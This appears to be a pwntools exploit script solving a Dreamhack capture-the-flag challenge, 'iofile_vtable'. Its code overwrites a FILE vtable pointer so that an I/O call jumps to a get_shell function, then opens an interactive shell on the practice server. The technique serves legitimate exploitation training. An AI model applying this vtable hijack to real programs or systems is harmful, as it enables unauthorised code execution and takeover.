from pwn import *
from time import sleep
context.log_level = 'debug'
context.binary = exe = ELF('./iofile_vtable', checksec=False)

#r = process(exe.path)
r = remote('host3.dreamhack.games', 15837)
get_shell = exe.sym['get_shell']
addr_name = 0x6010d0
log.info("The address of get_shell: " + hex(get_shell))
log.info("The address of variable name: " + hex(addr_name))
sleep(2)

r.sendlineafter(b'what is your name: ', p64(get_shell))

r.sendlineafter(b'> ', b'4')
r.sendlineafter(b'change: ', p64(addr_name - 56))
r.sendlineafter(b'> ', b'2')
r.interactive()